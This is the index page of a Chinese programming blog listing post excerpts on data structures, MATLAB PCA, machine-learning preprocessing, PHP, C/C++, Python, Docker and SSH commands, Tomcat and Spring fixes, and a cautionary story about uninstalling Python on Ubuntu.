<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afb81b6e6f91c05b41df0bf0986f75fb/" rel="bookmark">
			整数顺序表的基本运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述
设计整数顺序表的基本运算程序，并用相关数据进行测试
输入
顺序输入顺序表A的元素个数及各个元素
输出
第一行：创建顺序表A后，输出所有元素
第二行：删除第一个元素，输出删除后的所有元素
第三行：输出删除元素后顺序表的长度
第四行：在第二元素处插入一个新的元素100
第五行：输出第一个元素100所在位置
//顺序表的好处就是找的时候特别方便，地址也是连续的 #include&lt;iostream&gt; const int N=110; using namespace std; class List { int data[N]; int length; public: List(){length=0;} List(int n); void del(int i);//删除 int l();//长度 void print();//输出 void insert(int x,int i);//插入 int Locate(int i);//按值 }; List::List(int n) { for(int i=0;i&lt;n;i++) cin&gt;&gt;data[i]; length=n; } int List::l() { return length; } void List::print() { for(int i=0;i&lt;length;i++) cout&lt;&lt;data[i]&lt;&lt;" "; cout&lt;&lt;endl; } void List::insert(int x,int i) { for(int j=length;j&gt;=i;j--) data[j]=data[j-1]; data[i-1]=x; length++; } int List::Locate(int x) { for(int i=0;i&lt;length;i++) if(data[i]==x) return i+1; return 0; } void List::del(int i) { int x; x=data[i-1]; for(int j=i;j&lt;length;j++) data[j-1]=data[j]; length--; } int main() { int n; cin&gt;&gt;n; List l(n); l.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afb81b6e6f91c05b41df0bf0986f75fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ae08a30c42566968e41e0e709df0527/" rel="bookmark">
			如何用MATLAB中的PCA函数进行数据降维
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		coeff = pca(X)返回n×p数据矩阵的主成分系数。X的行对应于观察值，就是样本，列对应于变量，也就是特征。
系数矩阵是p×p。coeff的每一列包含一个主成分的系数，这些列按成分方差的降序排列。
默认情况下，pca以数据为中心，使用奇异值分解(SVD)算法。
一般用下面这个函数来进行获取投影矩阵Pro_Matrix。
获得投影矩阵后，通过下面这条语句得到降维后的数据。
Y=Pro_Matrix'*X; function [Pro_Matrix,Mean_Image]=my_pca(Train_SET,Eigen_NUM) %输入： %Train_SET：训练样本集，每列是一个样本，每行一类特征，Dim*Train_Num %Eigen_NUM：投影维数 %输出： %Pro_Matrix：投影矩阵 %Mean_Image：均值图像 [Dim,Train_Num]=size(Train_SET); %当训练样本数大于样本维数时，直接分解协方差矩阵 if Dim&lt;=Train_Num % 比如 100个特征 150列数据，数据量大于特征量 Mean_Image=mean(Train_SET,2); Train_SET=bsxfun(@minus,Train_SET,Mean_Image); R=Train_SET*Train_SET'/(Train_Num-1); [eig_vec,eig_val]=eig(R); eig_val=diag(eig_val); [~,ind]=sort(eig_val,'descend'); W=eig_vec(:,ind); Pro_Matrix=W(:,1:Eigen_NUM); else %构造小矩阵，计算其特征值和特征向量，然后映射到大矩阵 Mean_Image=mean(Train_SET,2); % 200个特征 100列数据，数据量明显不足 Train_SET=bsxfun(@minus,Train_SET,Mean_Image); R=Train_SET'*Train_SET/(Train_Num-1); [eig_vec,eig_val]=eig(R); eig_val=diag(eig_val); [val,ind]=sort(eig_val,'descend'); W=eig_vec(:,ind); Pro_Matrix=Train_SET*W(:,1:Eigen_NUM)*diag(val(1:Eigen_NUM).^(-1/2)); end end 有时候我们并不知道要降至多少维，但是有贡献率的要求，比如我希望降维之后的空间特征可以有90%的贡献率，那么可以用下面这个程序：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb81250d3e6959364e250abd4be70e01/" rel="bookmark">
			机器学习任务的一般流程及必要步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.数据收集
2.数据预处理与特征工程
2.1 数据清理
2.2 数据集成
2.3 数据规约
2.4 数据变换
3.模型的选择与训练
4.模型的评估与优化
处理机器学习问题，通常分为以下几步：
1 数据收集 通常，我们拿到一个具体的领域问题后，可以使用网上一些具有代表性的、大众经常会用到的公开数据集。相较于自己整理的数据集，显然大众的数据集更具有代表性，数据处理的结果也更容易得到大家的认可。此外，大众的数据集在数据过拟合、数据偏差、数值缺失等问题上也会处理的更好。但如果在网上找不到现成的数据，那我们只好收集原始数据，再去一步步进行加工、整理，这将是一个漫长的过程，需要我们足够细心。
2 数据预处理与特征工程 在真实数据中，我们拿到的数据可能包含了大量的缺失值，可能包含大量的噪音，也可能因为人工录入错误导致有异常点存在，非常不利于算法模型的训练。
数据的质量，直接决定了模型的预测和泛化能力的好坏。它涉及很多因素，包括：准确性、完整性、一致性、时效性、可信性和解释性。
数据预处理的主要步骤分为：数据清理、数据集成、数据规约和数据变换。
2.1 数据清理 数据清理(data cleaning) 的主要思想是通过填补缺失值、光滑噪声数据，平滑或删除离群点，并解决数据的不一致性来“清理“数据。
1、缺失值的处理
针对这些缺失值的处理方法，主要是基于变量的分布特性和变量的重要性（信息量和预测能力）采用不同的方法。主要分为以下几种：
删除变量：若变量的缺失率较高（大于80%），覆盖率较低，且重要性较低，可以直接将变量删除。
定值填充：工程中常见用-9999进行替代
统计量填充：若缺失率较低（小于95%）且重要性较低，则根据数据分布的情况进行填充。对于数据符合均匀分布，用该变量的均值填补缺失，对于数据存在倾斜分布的情况，采用中位数进行填补。
插值法填充：包括随机插值，多重差补法，热平台插补，拉格朗日插值，牛顿插值等
模型填充：使用回归、贝叶斯、随机森林、决策树等模型对缺失数据进行预测。
哑变量填充：若变量是离散型，且不同值较少，可转换成哑变量，例如性别SEX变量，存在male,fameal,NA三个不同的值，可将该列转换成 IS_SEX_MALE, IS_SEX_FEMALE, IS_SEX_NA。若某个变量存在十几个不同的值，可根据每个值的频数，将频数较小的值归为一类’other’，降低维度。此做法可最大化保留变量的信息。
总结来看，楼主常用的做法是：先用pandas.isnull.sum()检测出变量的缺失比例，考虑删除或者填充，若需要填充的变量是连续型，一般采用均值法和随机差值进行填充，若变量是离散型，通常采用中位数或哑变量进行填充。
注意：若对变量进行分箱离散化，一般会将缺失值单独作为一个箱子（离散变量的一个值）
2、离群点处理
异常值是数据分布的常态，处于特定分布区域或范围之外的数据通常被定义为异常或噪声。
异常分为两种：“伪异常”，由于特定的业务运营动作产生，是正常反应业务的状态，而不是数据本身的异常；“真异常”，不是由于特定的业务运营动作产生，而是数据本身分布异常，即离群点。
主要有以下检测离群点的方法：
简单统计分析：根据箱线图、各分位点判断是否存在异常，例如pandas的describe函数可以快速发现异常值。
3σ原则：若数据存在正态分布，偏离均值的3σ之外. 通常定义P(|x-u|&gt;3σ)&lt;=0.003范围内的点为离群点。
基于绝对离差中位数（MAD）：这是一种稳健对抗离群数据的距离值方法，采用计算各观测值与平均值的距离总和的方法。放大了离群值的影响。
基于距离：通过定义对象之间的临近性度量，根据距离判断异常对象是否远离其他对象，缺点是计算复杂度较高，不适用于大数据集和存在不同密度区域的数据集
基于密度：离群点的局部密度显著低于大部分近邻点，适用于非均匀的数据集
基于聚类：利用聚类算法，丢弃远离其他簇的小簇。
总结来看，在数据处理阶段将离群点作为影响数据质量的异常点考虑，而不是作为通常所说的异常检测目标点，因而楼主一般采用较为简单直观的方法，结合箱线图和MAD的统计方法判断变量的离群点。
具体的处理手段：
根据异常点的数量和影响，考虑是否将该条记录删除，信息损失多
若对数据做了log-scale 对数变换后消除了异常值，则此方法生效，且不损失信息
平均值或中位数替代异常点，简单高效，信息的损失较少
在训练树模型时，树模型对离群点的鲁棒性较高，无信息损失，不影响模型训练效果
3、噪声处理
噪声是变量的随机误差和方差，是观测点和真实点之间的误差，即obs = xε。通常的处理办法：对数据进行分箱操作，等频或等宽分箱，然后用每个箱的平均数，中位数或者边界值（不同数据分布，处理方法不同）代替箱中所有的数，起到平滑数据的作用。另外一种做法是，建立该变量和预测变量的回归模型，根据回归系数和预测变量，反解出自变量的近似值。
2.2 数据集成 数据分析任务多半涉及数据集成。数据集成将多个数据源中的数据结合成、存放在一个一致的数据存储，如数据仓库中。这些源可能包括多个数据库、数据方或一般文件。
1.实体识别问题：例如，数据分析者或计算机如何才能确信一个数 据库中的 customer_id 和另一个数据库中的 cust_number 指的是同一实体?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb81250d3e6959364e250abd4be70e01/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/681ad6333270e584277a9a4c0f5193df/" rel="bookmark">
			PHP代码实现获取7天，30天，90天内的数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PHP代码实现获取7天，30天，90天内的数据 PHP实现获取天数关键代码实现：
实现原理：
结束时间=当前时间
开始时间=当前时间减去86400*天数 代码如下：
$map['create_time'] = array('between', array(time()-86400*7, time())); //最近7天 $map['create_time'] = array('between', array(time()-86400*30, time())); //最近30天 $map['create_time'] = array('between', array(time()-86400*90, time())); //最近90天 $data = M('User')-&gt;where($map)-&gt;select();
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65b68e23e5e8827202f9ba83bc2f3789/" rel="bookmark">
			extern的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		extern有以下三种用法：
1.用于修饰变量。
变量可以分为全局变量和局部变量两种。在一个工程的各个文件中定义的全局变量相互之间是可见的，故我们不能在两个文件中定义同名的全局变量，而可以在文件中使用在另一个文件中定义的全局变量来获取信息(不推荐使用，会降低代码的易读性)。可以在文件中的任意位置使用如下语法来使用另一个文件中的全局变量。
extern 类型名 变量名； 上面的语法相当于一个声明(注意不可以在“声明”时对变量赋值，而可以在定义该变量出赋值，如果定义时未赋值，则全局变量默认值为0)，之后我们便可以在这个声明的作用域内像使用一个普通变量一样使用这个变量(可以改变其值)。即：如果你在文件开头声明这个变量便可以在这个文件中随意使用这个变量，但不能在函数外面给变量赋值(没有意义，而且会报错)。一般的用法有两种：一种是在需要使用时使用上面的语法声明变量。另一种是将上述语句放在头文件中，这样便可以在包含该头文件的文件中使用该变量。
2.用于修饰函数声明。
函数和变量不同，函数都是全局的。我们只需在使用该函数的文件中声明该函数即可。故从对编译器来说有没有extern是一样的，但在写代码时在函数声明前加extern在一定程度上会提升代码的易读性(现在IDE都很好用，故extern在函数声明中基本没用)。其语法就是：extern 函数声明语法
3.extern “C”。
这种语法主要是为了能在C++中使用c语言的代码。其语法为：
extern "C" { .......代码 } 这向编译器指明这段代码按照C语言的方式进行编译。虽然C++兼容C语言的语法，但是编译器在处理代码时的方式是有差异的，例如对待函数的名字处理上因为C++支持重载而C语言不。如果将C语言和C++的代码放到一起编译则不需加这个。而如果在C++中使用C语言已经编译好的模块。调用其中的函数则要加上上面的声明，不然会找不到函数。
Static
的1和2是关于extern对于变量和函数的作用。而static也有相似的语法，而且其作用正好相反。由static修饰的全局变量和函数其作用域被限制在本文件内，不可在其他文件被使用。用static修饰函数时必须在原型和定义中都加上static。
另外还有一个知识点，由const修饰的全局变量（其实为符号常量）的连接性是内部的，即只在本文件内部可见。故可将其放在头文件中，当头文件被多个源文件包含时相当于在多个文件中都定义了一个同名的全局变量（符号常量），其相互之间不可见。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11f76aa796f8b4c9838b02db54704a18/" rel="bookmark">
			后缀树（一）定义及构造
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		后缀树（Suffix tree）： ：一个具有m个词的字符串S的后缀树T，就是一个包含一个根节点的有向树，该树恰好带有m个叶子，这些叶子被赋予从1到m的标号。 每一个内部节点，除了根节点以外，都至少有两个子节点，而且每条边都用$的一个非空子串来标识。出自同一节点的任意两条边的标识不会以相同的词开始。后缀树的关键特征是:对于任何叶子i，从根节点到该叶子所经历的边的所有标识串联起来后恰好拼出S的从i位置开始的后缀，即S[i,…,m]。树中节点的标识被定义为从根到该节点的所有边的标识的串联。
后缀：一个长度为m的字符串序列S=s1 s2 ....sm，记Si=si si+1 .....sm为S的第 i 个后缀，显然S1=S 为原来的字符串；
后缀树的定义：长度为m的序列S，其后缀树是一个有向树，满足以下条件：
1）有m个叶结点； 2）除了根结点和叶结点，每一个内部结点至少有两条边（子节点），每条边对应S中的一个非空序列；
3）从任何一个内部结点出发的两条边对应的字符串序列的第一个字符都不相同；
4）从根结点到叶结点的路径上的字符序列构成了S从i开始的一个后缀字符串；
路径标签：一个路径上对应的字符序列称为路径标签；
结点标签：从根结点开始到此结点对应的路径的标签称为结点标签；
并不是所有的字符序列都有后缀树，例如xabxa（其后缀有xabxa，abxa，bxa，xa，a）xa为xabxa的前缀，为了解决此问题，通常在字符串末尾加上$符号，使得任何一个后缀都不为其他后缀的前缀。
（xabxa$的后缀树）
注：从根结点到叶子结点路径上的字符（词）表示对应叶节点 i 开始的某一个后缀字符串，叶子结点存储了起始位置 i 有几个字符（词）就有几个叶子结点，根结点和内部结点不存储任何数据，只有叶子结点和边存储数据；
隐含后缀树：序列S的隐含后缀树是指，序列S$的后缀树，去掉那些有$的边的$符号，之后将空边删除所得到的树；
（xabxa$的隐含后缀树）
即：隐含后缀树构造即删除所有边的$符号之后将空边删除；
后缀树的构造： 根据S字符串的前缀s1 s2....si构造隐含后缀树Ti，当i=m时即可构造出S的隐含后缀树；
后缀树伪代码 1、初始化一个隐含后缀树 for i 从 1 到 m: //m为字符串长度 逐步构造隐含后缀树 for j 从 1 到 i+1: #后缀拓展规则 在已经构建好的后缀树中找到从root结点出发 标记位S[j....i]的序列，如果需要的话将 S[i+1]加入到这条路径后面 进行下一次隐含后缀树的构造 end //完成整个后缀树的构造 后缀的扩展规则：
令β=S【j....i】，这里的β为S【1....i】的某一个后缀，第j步扩展是为了保证序列β，S【i+1】在树中；
1、规则1：路径β是以一个叶子结点结尾的只需将S【i+1】直接加入在叶子结点上面；
（路径β以一个叶子结点为结束，直接在此路径上增加一个S【i+1】）
2、规则2：路径β后面没有以S【i+1】开始，但至少有一个路径是β的延续，如果β终止于内部结点则新建一个叶子结点
作为这个内结点的子结点并将此边标记为S【i+1】，当β是在一条边的中间时除了建立一个子结点外还要建立一个从根结点
出发标记为β的内部结点。
（路径β在中间部分则从其末尾插入一个内部结点以及生成这个内部结点的子结点其路径标记为S【i+1】）
3、规则3：有某个路径是β的末端开始且S【i+1】开头则无需进行任何操作；
（有以β开头的路径什么也不做）
例子：字符串S=“axabxb“的后缀树的逐步构建；
字符axabxb下标123456 时间复杂度分析：
对于内层循环每一次都要寻找一条路径β，其时间复杂度为O（β）内外层循环为O（i^2），合起来时间复杂度为O（m^3）;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8144da674dbb5f6949f8fb93f4ae8376/" rel="bookmark">
			实用命令备忘锦集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、docker篇 删除所有未运行的容器（已经运行的删除不了，未运行的就一起被删除了）
docker rm $(sudo docker ps -a -q) 根据容器的状态，删除Exited状态的容器
docker rm $(sudo docker ps -qf status=exited) 删除所有容器
docker rm `docker ps -a -q` 删除所有镜像
docker rmi `docker images -q` 按条件删除镜像
没有打标签
docker rmi `docker images -q | awk '/^&lt;none&gt;/ { print $3 }'` 镜像名包含关键字(其中doss-api为关键字)
docker rmi --force `docker images | grep doss-api | awk '{print $3}'` 使用docker attach进入Docker容器
docker run -itd ubuntu:14.04 /bin/bash docker attach 44fc0f0582d9 以此为基础运行一个容器
docker run -i -t --rm ubuntu:16.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8144da674dbb5f6949f8fb93f4ae8376/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b5ec3f8cf36ca536ff37399f8363ebd/" rel="bookmark">
			Python——魔方方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python中，所有以“__”双下划线包起来的方法，都统称为“Magic Method”，中文称『魔术方法』,例如类的初始化方法 init ,Python中所有的魔术方法均在官方文档中有相应描述，但是对于官方的描述比较混乱而且组织比较松散。很难找到有一个例子。
构造和初始化 1、init：初始化函数，在创建实例对象为其赋值时使用，在__new__之后，__init__必须至少有一个参数self，就是这个__new__返回的实例，__init__是在__new__的基础上可以完成一些其它初始化的动作，__init__不需要返回值。
from os.path import join class FileObject: '''给文件对象进行包装从而确认在删除时文件流关闭''' def __init__(self, filepath='~', filename='sample.txt'): #读写模式打开一个文件 self.file = open(join(filepath, filename), 'r+') def __del__(self): self.file.close() del self.file 2、new:很多人认为__init__是类的构造函数，其实不太确切，__init__更多的是负责初始化操作，相当于一个项目中的配置文件，__new__才是真正的构造函数，创建并返回一个实例对象，如果__new__只调用了一次，就会得到一个对象。继承自object的新式类才有__new__这一魔法方法，__new__至少必须要有一个参数cls，代表要实例化的类，此参数在实例化时由Python解释器自动提供,__new__必须要有返回值，返回实例化出来的实例（很重要），这点在自己实现__new__时要特别注意，可以return父类__new__出来的实例，或者直接是object的__new__出来的实例，若__new__没有正确返回当前类cls的实例，那__init__是不会被调用的，即使是父类的实例也不行。__new__是唯一在实例创建之前执行的方法，一般用在定义元类时使用。
创建对象的步骤：
a、首先调用__new__得到一个对象
b、调用__init__为对象添加属性
c、将对象赋值给变量
下面来看一个结合__init__和__new__两个魔法方法的例子：
class A(object): pass class B(A): def __init__(self): print("这是__init__方法") def __new__(cls, *args, **kwargs): print("这是__new__方法") print(id(cls)) return object.__new__(cls) b =B() #这是__new__方法 #1855412042008 #这是__init__方法 print(b) #&lt;__main__.B object at 0x0000020ED3A1A358&gt; print(type(b)) #&lt;class '__main__.B'&gt; print((id(A))) #1855412031624 print(id(B)) #1855412042008 从运行结果看，new__中参数cls和B的id相同，表明__new 中默认的参数cls就是B类本身，同时在return时返回了B类的实例，在创建完实例之后还需调用__init__函数，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b5ec3f8cf36ca536ff37399f8363ebd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b81d54afa7b87dae8d988390323cd0b0/" rel="bookmark">
			btoa 和 atob 的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		btoa ( binary to ascii ) 和 atob ( ascii to binary ) 是 window的两个对象, 用于将字符串转为 base64 编码以及将 base64 编码解密为 字符串
// Define the string var string = 'hello world!' // Encode the string var encodeString = btoa(string) console.log(encodeString) // "aGVsbG8gd29ybGQh" // Decode the String var decodeString = atob(encodeString) console.log(decodeString) // 'hello world!' 汉字不行, 至于为什么, 应该跟这个有关系:
Note: 由于这个函数将每个字符视为二进制数据的字节，而不管实际组成字符的字节数是多少，所以如果任何字符的码位超出 0x00 ~ 0xFF 范围，则会引发 InvalidCharacterError 异常。请参阅 Unicode_字符串 ，该示例演示如何编码字符数超出 0x00 ~ 0xFF 范围的字符串
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b81d54afa7b87dae8d988390323cd0b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4423e5a37609152a57861db70574278b/" rel="bookmark">
			使用ssh在远程设备中运行命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用ssh在远程设备中运行命令 实行单个命令 ssh username@xxx.xxx.xxx command 这里command可以是任何可在远端执行的命令，例如df -h或者ls等
批量执行命令 直接输入命令 ssh username@xxx.xxx.xxx "command1;command2;command3" 例如：
ssh username@xxx.xxx.xxx "ls; pwd; df -h" 将命令编写成脚本文件
例如：
run.sh #!/bin/bash ls pwd df -h ssh username@xxx.xxx.xxx &lt;run.sh 这里run.sh文件为可执行的脚本文件，&lt;为输入重定向符号，将文本中的内容输入到指令中
问题记录 操作系统为windows时出现问题 连接不上问题 Pseudo-terminal will not be allocated because stdin is not a terminal
此问题由于无法打开伪终端导致，在使用ssh时加入指令-t -t 或 -tt都可以
ssh -tt username@xxx.xxx.xxx &lt;run.sh 或 ssh -t -t username@xxx.xxx.xxx &lt;run.sh 参考文章stackoverflow：Pseudo-terminal will not be allocated because stdin is not a terminal
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4423e5a37609152a57861db70574278b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bddacef43466baab262c73223a59e6a9/" rel="bookmark">
			Centos-64位系统环境运行出错：Address 0xfffffffff0007b30 out of bounds
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题背景 开发一个功能，在centos-32bit环境下运行好好的，切换部署到centos-64bit环境竟然崩溃了段错误，调试之，提示out of bounds。
问题分析 根据现象是内存出错（要么被释放了，要么越界），仔细分析下源码，没问题呀，malloc主动分配，不应该会被系统回收释放，地址范围也没错；
断点一步步调试，发现是在调用某个so库的函数时返回一个指针，在返回的下一步就提示out of bounds，查看对应内存地址，原来的值确实也没了，看来问题应该是在函数调用返回的时候触发的；这个函数是在一个线程环境中执行的，难道跟线程调用有关系；扣取调用so函数的代码放到主线程，还是挂（跟线程环境没关系？）；接下来干脆放到main函数去调用，竟然没挂，这时候想起来有人引用了对应的头文件可以解决问题，报着尝试的态度，发现还真没有include，添加后，再运行，正常了。
总结 这个应该是centos64环境下gcc编译c代码规则更严格了，仔细查了下编译信息，确实有implicit declaration of function的警告，所以为了避免一些不必要的奇怪现象，坚决做到0警告，0错误才行。
查看原文
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b7d982bb42c11f307575878d7cc7bf9/" rel="bookmark">
			接口请求返回400状态码,后端代码报错: java.lang.IllegalArgumentException: Invalid character found in the request targ
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 错误原因： 当在浏览器中访问时 URL中带有特殊字符，如花括号冒号时，就会出现这个错误。
例如：http://localhost:8080/index.do?{id:123}
二. 解决办法 1、去除URL中的特殊字符；
3、使用 Post 方法提交数据
4、更换低版本的Tomcat来规避这种问题。
5、在 conf/catalina.properties 添加或者修改：
tomcat.util.http.parser.HttpParser.requestTargetAllow=|{}[]
重启服务器后，解决问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/268f86bb08a9be10ca06b2b99bc336ff/" rel="bookmark">
			C# 给数值添加千分位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 /* * 由SharpDevelop创建。 * 用户： Administrator * 日期: 2019/08/28 * 时间: 09:40 * * 给数值添加千分位 * * 要改变这种模板请点击 工具|选项|代码编写|编辑标准头文件 */ using System; using System.Text.RegularExpressions; namespace test2 { class Program { public static void Main(string[] args) { double n =Convert.ToDouble(Console.ReadLine()); Console.WriteLine(nuber(n)); Console.ReadKey(); } private static String nuber(double n) { //	string str = DecimalFormat.getNumberInstance().format(n); string str =n.ToString("N"); if (str.IndexOf(".") &gt; 0) { str =Regex.Replace(str.Trim(),"0+?$", " "); str =Regex.Replace(str.Trim(),"[.]$", " "); } return str; } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be7dc8457a4b624d7910524a1c86d782/" rel="bookmark">
			select下拉菜单实现二级联动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：建立年级、班级两个数据表，获取年级表信息，根据年级，获取相应的班级
效果图：
不完美的地方就是在不选择年级的时候，是不能选择任何班级的（当然，这个也是有解决方案的。可可以百度一下动态sql，使用动态失去了即可解决）。
代码部分 首先是建立两个表的实体 需要注意的就是写注解了。代码就不贴了。
DAO层代码 年级DAO 年级的DAO层没什么代码，就是继承那三个类，具体用到哪个我也不清楚，就直接都继承了。
public interface GraceDAO extends PagingAndSortingRepository&lt;Grace, String&gt;,JpaSpecificationExecutor&lt;Grace&gt;,JpaRepository&lt;Grace, String&gt; { } 班级DAO 班级DAO里面就这一行代码，用的是内置的findBy方法，我的gid在数据库中是int型，在这里为了方便用的string型（我的可以实现操作，不可以的话强制转型成int就可以了，问题不大）
List&lt;Cla&gt; findByGid(String gid); service层 年级 年级这里不需要有什么操作，直接查出全部就可以了，所以我就用了内置的findAll方法
@Service public class GraceService { @Autowired private GraceDAO graceDAO; public List&lt;Grace&gt; findAll(){ return graceDAO.findAll(); } } ///下面是内置findAll方法的注释什么的。用不到，只是贴出来给大家看一下 /* * (non-Javadoc) * @see org.springframework.data.repository.CrudRepository#findAll() */ List&lt;T&gt; findAll(); 班级 班级这里要根据获取到的gid进行查询
public List&lt;Cla&gt; findByGid(String gid){ return claDAO.findByGid(gid); } Controller层 //查询所有年级信息 @RequestMapping("grace") @ResponseBody public List&lt;Grace&gt; grace(){ return graceService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be7dc8457a4b624d7910524a1c86d782/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4682aec1556c4de197c9b4a7e670c2dd/" rel="bookmark">
			Ubuntu卸载python（慎重）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu卸载python（慎重） 看到这篇博客你还有机会收手 Ubuntu系统下不要轻易卸载系统自带的python（2.7、3.5），因为Ubuntu依赖python环境。
惨痛经历：
卸载python3.5（作死）
sudo apt-get remove python3.5 # 卸载python3.5
sudo apt-get remove --auto-remove python3.5 # 卸载python3.5及其依赖
sudo apt-get purge python3.5 或 sudo apt-get purge --auto-remove python3.5 # 清除python3.5
后果：第一条命令之后
桌面的图标一个一个消失…刚开始我还以为眼花了，什么东西闪了一下；桌面一些图标变灰… 意识到不对劲，我赶紧终止…然…（炸了，重装系统了）
一同落难的弟兄们： ubuntu中卸载python的后果，很惨
完全卸载Python for ubuntu
Ubuntu删除python惹的祸
补救措施： ubuntu卸载python后抢救方法
Ubuntu卸载自带Python后无法进入桌面
Linux-Ubuntu，卸载python同时删除其依赖，系统出现问题解决办法。
用apt-get remove python命令卸载后出现的坑，你填得上么？
ubuntu16.4 卸载python3后出错。求救！
幸亏不在服务器上（狗头保命0_0！）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9639899093de96c8a981d288c24623dd/" rel="bookmark">
			C标准I/O库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 写在前面标准I/O库和底层文件描述符区别fopen函数fread函数fwrite函数fclose函数fflush函数fseek函数fgetc、getc和getchar函数fputc、putc、putchar函数fgets和gets函数格式化输入和输出printf、fprintf和sprintf函数 其他流函数 TODO 写在前面 本文章参考了==Linux程序设计 第4版（人民邮电出版社）==第三章文件操作里相关知识。
标准I/O库和底层文件描述符区别 标准I/O库（stdio）和它的头文件stdio.h为底层I/O系统调用提供了一个通用的接口。
首先，需要区分标准I/O库和底层文件描述符。
函数头文件底层文件描述符write、read、open、close、ioctl、dup等unistd.h sys/types.h sys/stat.h等标准I/O库fopen、fclose、fread、fwrite、fseek、printf等stdio.h 注：目前只了解到表面用法，具体深层后续持续更新中
fopen函数 fopen类似于底层的open系统调用。它主要用于文件和终端的输入输出。如果你需要对设备进行明确控制，那最好使用底层系统调用，因为这可以避免用库函数带来的一些潜在问题，如输入/输出缓冲。
函数原型如下：
#include &lt;stdio.h&gt; FILE *fopen(const char *filename, const char *mode); fopen打开由filename参数指定的文件，并把它与一个文件流关联起来。mode参数指定文件的打开方式，它取下列字符串中的值：
mode含义“r"或"rb”以只读方式打开“w"或"wb”以写方式打开，并把文件长度截短为0“a"或"ab”以写方式打开，新内容追加在文件尾"r+"或"rb+“或"r+b”以更新方式打开（读和写）"w+"或"wb+“或"w+b”以更新方式打开，并把文件长度截短为0"a+"或"ab+“或"a+b”以更新方式打开，新内容追加在文件尾 fopen调用成功则返回一个非空、指向被打开文件的FILE*指针,失败则返回NULL。
